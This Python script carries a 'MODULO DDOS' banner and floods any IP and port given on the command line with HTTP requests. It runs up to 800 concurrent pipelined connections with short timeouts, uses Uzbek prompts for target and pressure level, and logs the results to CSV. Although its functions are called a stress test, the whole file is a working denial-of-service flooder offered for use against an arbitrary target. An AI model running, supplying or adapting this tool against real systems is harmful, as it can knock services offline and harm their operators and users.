import pycurl
import csv
import time
import sys
import certifi
from datetime import datetime
from colorama import Fore, Style, init, Back

init(autoreset=True)

# Colors
SUCCESS, ERROR, INFO = Fore.GREEN, Fore.RED, Fore.CYAN
HIGHLIGHT, MUTED = Fore.MAGENTA, Fore.LIGHTBLACK_EX
REAL_ORANGE = "\033[38;2;255;140;0m"

stats_data = []

def print_banner():
    banner = f"""
{REAL_ORANGE}
███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗██╗      ██████╗     ██████╗ ██████╗  ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗██║   ██║██║     ██╔═══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██╔████╔██║██║   ██║██║  ██║██║   ██║██║     ██║   ██║    ██║  ██║██║  ██║██║   ██║███████╗
██║╚██╔╝██║██║   ██║██║  ██║██║   ██║██║     ██║   ██║    ██║  ██║██║  ██║██║   ██║╚════██║
██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝███████╗╚██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

{Style.DIM}{Fore.WHITE}by Qudratillo Salohiddinov{Style.RESET_ALL}
"""
    print(banner)

def run_stress_test(target_ip, target_port, total_reqs):
    url = f"http://{target_ip}:{target_port}/"
    
    # OS SAFEGUARDS: Keep concurrent sockets high but below default OS limits (usually 1024)
    MAX_CONCURRENT = 800 
    
    multi = pycurl.CurlMulti()
    # Enable HTTP Pipelining and Multiplexing for massive speed increase
    multi.setopt(pycurl.M_PIPELINING, 3) 
    multi.setopt(pycurl.M_MAX_TOTAL_CONNECTIONS, MAX_CONCURRENT)
    
    pending_ids = list(range(total_reqs))
    active_handles = {}
    processed = 0
    start_bench = time.perf_counter()

    print(f"{INFO}{Style.BRIGHT}Nishon manzili:{Fore.MAGENTA} {url}")
    print(f"{INFO}{Style.BRIGHT}Bosim darajasi:{Fore.RESET} {total_reqs} ta so'rov\n")

    while processed < total_reqs:
        # 1. Fill the pool - Only add what the OS can handle
        while len(active_handles) < MAX_CONCURRENT and pending_ids:
            req_id = pending_ids.pop(0)
            c = pycurl.Curl()
            c.setopt(pycurl.URL, url)
            c.setopt(pycurl.TIMEOUT, 2) # Low timeout to cycle through failed ports faster
            c.setopt(pycurl.NOBODY, True) 
            c.setopt(pycurl.TCP_KEEPALIVE, 1)
            c.setopt(pycurl.TCP_NODELAY, 1) # Disable Nagle's algorithm for instant packet firing
            
            # Metadata
            c.req_id = req_id
            c.start_time = time.perf_counter()
            
            try:
                multi.add_handle(c)
                active_handles[c] = req_id
            except pycurl.error:
                pending_ids.insert(0, req_id) # Put back if OS refused
                break

        # 2. Execute with minimal delay
        while True:
            ret, _ = multi.perform()
            if ret != pycurl.E_CALL_MULTI_PERFORM:
                break

        # 3. Harvest results
        while True:
            num_q, ok_list, err_list = multi.info_read()
            for c in ok_list:
                handle_result(c, "success", active_handles, multi)
                processed += 1
            for c, errno, errmsg in err_list:
                handle_result(c, f"XATOLIK:{errmsg}", active_handles, multi)
                processed += 1
            if num_q == 0:
                break
        
        # Speed Optimization: Using a much smaller sleep for tighter loops
        multi.select(0.01)

    # FINAL PERFORMANCE LOG
    end_bench = time.perf_counter()
    total_time = end_bench - start_bench
    rps = total_reqs / total_time
    print('\n')
    print(f"{HIGHLIGHT}TEST COMPLETE{Style.RESET_ALL}")
    print(f"{INFO}Total Time:    {total_time:.2f} seconds")
    print(f"{INFO}Total Reqs:    {total_reqs}")
    print(f"{BRIGHT_GREEN if rps > 1000 else SUCCESS}AVG SPEED:     {rps:.2f} requests/sec")
    print('\n')

def handle_result(c, status, active_handles, multi):
    latency = time.perf_counter() - c.start_time
    req_id = active_handles.pop(c)
    http_code = c.getinfo(pycurl.HTTP_CODE)

    if status == "success":
        sys.stdout.write(f"{SUCCESS}[+]{Style.RESET_ALL} #{req_id:05} {MUTED}{latency:.4f}s{Style.RESET_ALL} STATUS={http_code}\n")
    else:
        sys.stdout.write(f"{ERROR}[-]{Style.RESET_ALL} #{req_id:05} {ERROR}{status}{Style.RESET_ALL}\n")

    stats_data.append({
        "request_id": req_id,
        "timestamp": datetime.now().strftime("%H:%M:%S.%f"),
        "latency_sec": round(latency, 4),
        "http_status": http_code,
        "outcome": "success" if status == "success" else "failed"
    })
    
    multi.remove_handle(c)
    c.close()

def save_to_csv(filename):
    if not stats_data: return
    keys = stats_data[0].keys()
    with open(filename, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=keys)
        writer.writeheader()
        writer.writerows(stats_data)
    print(f"{SUCCESS}DATA SAVED TO: {HIGHLIGHT}{filename}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--requests", type=int, default=100)
    parser.add_argument("--output", default="result.csv")
    args, _ = parser.parse_known_args()

    BRIGHT_GREEN = "\033[38;5;82m"
    print_banner()
    try:
        run_stress_test(args.ip, args.port, args.requests)
    except KeyboardInterrupt:
        print(f"\n{ERROR}Manual Stop Triggered.")
    finally:
        save_to_csv(args.output)